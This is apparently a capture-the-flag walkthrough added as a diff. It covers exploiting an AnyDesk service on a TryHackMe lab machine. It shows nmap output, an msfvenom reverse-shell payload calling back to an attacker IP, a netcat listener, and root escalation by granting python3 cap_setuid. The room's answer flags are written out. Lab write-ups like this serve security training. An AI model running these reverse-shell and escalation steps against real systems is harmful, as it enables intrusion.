@@ -1,0 +1,127 @@
+ip add: 10.10.150.189
+
+Nmap: 
+22/tcp    open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
+|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
+|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
+7070/tcp open  ssl/realserver? syn-ack
+| ssl-cert: Subject: commonName=AnyDesk Client
+| Issuer: commonName=AnyDesk Client
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-03-23T20:04:30
+| Not valid after:  2072-03-10T20:04:30
+| MD5:   3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0
+| SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b
+| -----BEGIN CERTIFICATE-----
+| MIICqDCCAZACAQEwDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAwwOQW55RGVzayBD
+| bGllbnQwIBcNMjIwMzIzMjAwNDMwWhgPMjA3MjAzMTAyMDA0MzBaMBkxFzAVBgNV
+| BAMMDkFueURlc2sgQ2xpZW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
+| AQEAvFEAPxFPrh1v6FuKL9k1AiX5ml+soPQ3sfYSr+5y7uJlqwy2C6HZ2Kf83gc0
+| MN/+GP4mWpB1LskMHDWf2173Sy8A+EBekxRn05tCs1gyxD19vHvqcorZD9JbN/Mz
+| Pq6kEvloUrHNKgkYyYPq3neAZ4RxQSTjAOydR+0aGWiDV4QNdzmKvwaunlvz8zoZ
+| Nr+tcI0UnP4jeAC3fSX7XfijPE7ANWaiwm4oVWOgiMXcTDGuJ78WptNJ7/XI+RFT
+| lkN8T69uHWLRUyN2YHG7OSK28UExyDShM08t3MyztWQmCtHqQd4hExdZoIkIW9bP
+| Qf4QS+mlal0rBYqNkZNXUNeX7QIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBe68Tz
+| 6xMMwAxJb0xWz7DIK9ffSVEnnBe3Epdi0a76B2I1eu59+DzZu1euw8UAak7i1lL/
+| +Yu/i6LfLHzjQuD7MMQUmGRlcsxMTOfYXiSbKAgAd8vt+a24Q8LKDASu8lmLNtj/
+| /GglirQnYStt6zb9f4Ud3YpPGDcqfS636YlnFDttmLMapI9GJZs+GTp+ukbxCH9j
+| hrhMjE+4d1Le5dFk0K2P2v/m8IMqc52Mkef7XR4CFMC+DOIRp8U3PN1i9rFOLFaE
+| FuZmniIJ30KAE+BCCPD+Ozx5cCcA8OYcT/Wyua5pPepP7ryR5lVbZmcAR9ELgzvm
+| mSn9KWFRlhAMUQ4V
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+
+45435/tcp open  unknown
+| fingerprint-strings: 
+|   NULL: 
+|     e.K9
+|     bsEv
+|     C$v@*
+|     iVA'
+|     'ZX<
+|     )i?6
+|     ^VDxU
+|_    'S$^
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port45435-TCP:V=7.91%I=7%D=7/15%Time=62D13389%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,FD2,"\x0f\xd0\x98\xcf\xd3\x17\n\xc7jNR\xe2Ew\tO\xfej\xddoh\x98\xd0\
+SF:xffoXT\xaaZ\xcdU\xfe\xa6\xa9U\xce&\xe2\xefS\"\x11\x0e\x03\x0e\xd7\x8c\x
+SF:08\x9e\xda\xd7\xca\x93\xd7\x80\x13_\xe3\x1d\x96\x9bS\0\xc4\x7f\*;\xe5\x
+SF:1f\x8fX\x05\x91~\x93\]\xfc\x05\xd9\xa7o\xf7Ys\xf1u7:\x97\xfb\xa5\x19\xc
+SF:0\[\x8c\x07\xd6\xab\xca\xb8`\xbc\xf1\x03c\x1aqa\xb6\xa5\x9f\xf2i=\xa1\x
+SF:ce><\x1b\xba\xf6\xeby\x12\x05\xd1\x9d2\x11dw\xb3\x9fV\xaaS\xe1\x866\xa0
+SF:\xb2\x88R\\\t\xcf\xb9F\xf5g\xaeng\xe3\xefR\xe1\x0f\xe9\xcd\xf8p\xf9Q\x1
+SF:8G\xa7A\xc3e\xd4f\xc3q\|\xab\xf4\xbc\xfd{\x98!\x9bZ\xf4v\x83\x8b\xe3\x9
+SF:9\x82\x89\x15\xa5y\xf9\xb8\xc0\xf7&\x9a\xa1\x07@\x84V@\xb0g\x9c\xb2\t>\
+SF:x94\xd9\x1d\x86\x80\xd2\xd1\x14\x9f\x13\x8az\xdd\xdb\x1b\x1f\xe0Z\x1a\x
+SF:8a:z\xffO\x8cFy\xf7\xf6\xcao\x07x\x95e\xb3\x84J\xc5\+\xf3\xef\xc9\]\xee
+SF:\x86\xdc\xf6D\x9a\xa5:\xca\x94\x06=k\x9c\x15\xc3f\x83\xfcQF\xaf\x11LF\x
+SF:01U\x95\xbep\x02\x87<l@\x147\xa3s\xcc\xb4\x10uk\xae\xf6\xea\x13\xae\xf5
+SF:\xbe\xc5\xf3\xbe\xd9X\xd2\xb5\x01\x92\xe4A\xae\xc0If-\x8d\x06\xf3}g\x17
+SF:3P\x1fD!\xeb\x06\xd9w\xfd\x0f~z\xb5\x07\x9d\t\|\xd1\"\|\x97\x1fa\x10&!\
+SF:xb9<b\x12\xade\.K9\xf5\xf2\x7f\xa7\xdf\xf0\x91\xe2\x11bsEv\x10\xebR\x88
+SF:\xa5<Z\xc17\x06\xd8Cf\r9\[\xe2@\xbe\xbd,\xd3H\"\x97\xd7\x06y\x1c\x94B\x
+SF:8c\xb1\xd4\xa9\xae\x97\xd5\xeb\xc6\xa6\xcb\xd4\xd8\xd8\xc4ws\x12\xbc\x9
+SF:1!\x9a\xd3\|\x08\xba\x0bySZ\xc3\xa50\0s_X\x89}\xeb\x1c9%h\xd3\xdf\xf78\
+SF:xec\xeeN\xb8\xf6\^#\xc4\xdb\xf6s\xd2\x7f>\xd5m\xeb\x18\x8e`\x1c\xcb\xc2
+SF:h\x7f\x8ec3\xd5\x11\x13\x14\xf8\xf5\+A\xf7\*\x92\x96t\x96\xb6\x12\x18\x
+SF:d3\xba\x9d\xe3\x9d\x98C\$v@\*\xf7\xc3\$T\x0c'\xc4\xb8p\xfe\]\xeb\x9a\x1
+SF:e\x06\$F\x95y\+\x12F\xa1\x1b\?I\xf0m\x02'\x0b\x12a\x7f't\xd8\xc4\xa3\x8
+SF:f\x81\x07J\xfd\x03\xae\x03\xd5m\xaf\xce\x81\xec!\"\x8e\x80\x11\xf1\x20\
+SF:|\xb7\x1fXA\xbd\x8f~\"\xd5\xc1!\xfd\xf5\xb1\x18\xe2\xad2\xd4w\xe5j\xac\
+SF:x0b5\"\xad\xb8\xa6Z\xde\xf5\xe8D\xee@Y\x9e\xef\xb5T\x19\x91iVA'\x19\xf3
+SF:\r\x8e\xa2\xa3`\xd0\xdf\xebNxp\x83\xfb0\xe1Q\xa1\x92\xe6\xe0@\x05\x15\x
+SF:e2\xc3\x8c\x83\x12A\x1d\xdc\xc9\x0e\xdb\xcdVG\x07{\x82}\xf9,N\x17\x07\x
+SF:d4\x84\xcf\x92JdT\xf6nX\xb5_\x1b-v\x03\x98p9H\xb0\xfe\xe2\x13\xf1\xa2\x
+SF:bbQ\*\x9a\ta\xa9\x95\x13r7\[\xd0\xab\xcb\xed\xa4\xca\xf5\xe3\xc7<z\xaf\
+SF:x1f\xc2ww\xee\xc5w\xfeu\x04\x1e\x9e<\xde\xa3\x9b\x17\x0cd\x1c'ZX<\xe3\x
+SF:a5\xa7\xe2\xee#\x15\x03q\x90\xe5\x89uD\xf4\x9d\xc0\xa4\xf4\^\xee9\x0b\x
+SF:85\(\x14t\xcc\x85\x0b@\xf0\xfd\t\x11a@\xf5\xcc\)i\?6\x81\^VDxU\x9d\x0ea
+SF:Zc\xd3y\xf5\xb8\xac\xf6\xbf2\xb5\xacJ\x8a\x82\x01n\xe3\xb9\xd9\x85\x07\
+SF:xa8m\xe6\x9e\t\x15\x15U\x93\x1a\x85/\xd5\x0b\xba\x86\xca\xd0y\xd7,\xa1\
+SF:x1f/\r\xaa\x99\t\xef\x9d\xdc-\xca\x98\xb37\xf3K\xdc:iv\xcc#\xf4E\x8b\xf
+SF:0\xf2~\xdb{\xee\x93\x90:\.\x8c\xdc4\xfd2\xf4T\xa8\xfc\xca\xe0\xc0`R\xaa
+SF:x\xb7}\xdd\xad'S\$\^\x84");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Found AnyDesk on port 7070
+PORT      STATE         SERVICE REASON
+50001/udp open|filtered unknown no-response
+50002/udp closed        unknown port-unreach ttl 63
+50003/udp closed        unknown port-unreach ttl 63
+
+Find AnyDesk exploit on exploitdb: https://www.exploit-db.com/exploits/49613
+
+Modify the exploit with correct ip target and port
+
+create custom payload:
+
+ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.1.148 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+
+add your custom payload to the exploit script
+
+Start a netcat listener: nc -lvnp 4444
+
+run the exploit to get a shell
+
+After you get a shell, stabilize it: python3 -c'import pty;pty.spawn("/bin/bash")'
+
+Get user flag: THM{N0t_Ju5t_ANY_D3sk}
+
+Look for suid binaries: find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+
+Looks like we have setcap so we can use this to gain root shell by adding extended permissions to the python binary on the machine:
+cp /usr/bin/python3 /home/annie/python3
+
+setcap cap_setuid+ep /home/annie/python3
+
+Now that we've added the extended permissions, all we need to do is use our python binary to spawn a shell and we'll have root. (Make sure you are using the binary that you added the +ep to not the one located in /usr/bin)
+
+./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+get root flag: THM{0nly_th3m_5.5.2_D3sk}
